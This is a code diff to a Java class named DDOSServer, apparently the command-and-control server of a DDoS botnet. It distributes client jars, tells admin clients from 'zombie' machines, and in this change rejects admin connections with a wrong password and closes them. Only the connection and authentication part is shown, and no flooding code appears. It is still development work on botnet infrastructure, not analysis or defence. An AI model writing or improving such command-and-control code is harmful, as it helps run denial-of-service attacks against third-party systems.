@@ -48,7 +48,7 @@ public class DDOSServer implements ClientConnectionListener, ClientDisconnection
 	public void clientConnected(SocketPackage event) {
 		try {
 			DataPackage initialPackage = (DataPackage) event.getInputStream().readSpecificType(DataPackage.class);
-			if (initialPackage.hasMessage()) {
+			if (initialPackage.getMessage().endsWith("REQUEST")) {
 				System.out.println(event.getConnection().getRemoteSocketAddress() + " A computer has request a jar: "
 						+ initialPackage.getMessage() + " (ID: " + initialPackage.getId() + ")");
 				if (initialPackage.getMessage().equals("CLIENT_JAR_REQUEST")) {
@@ -72,12 +72,16 @@ public class DDOSServer implements ClientConnectionListener, ClientDisconnection
 			boolean isClient = !(boolean) initialPackage.getObjects()[0];
 			println(event.getConnection().getRemoteSocketAddress() + " connected: " + (isClient ? "client" : "zombie"));
 			if (isClient) {
-				boolean success;
-				if (!(success = CLIENT_JAR_CODE.equals(initialPackage.getObjects()[1]))) {
+				boolean success = CLIENT_JAR_CODE.equals(initialPackage.getObjects()[1]);
+				event.getOutputStream().writeObject(new Boolean(success));
+				if (!success) {
 					System.out.println(event.getConnection().getRemoteSocketAddress()
 							+ " Kicked for having an invalid admin password.");
+
+					Thread.sleep(3000);
+					event.getConnection().close();
+					return;
 				}
-				event.getConnection().getOutputStream().writeObject(new Boolean(success));
 			}
 
 			server.setConnectionData(event, !isClient, null);
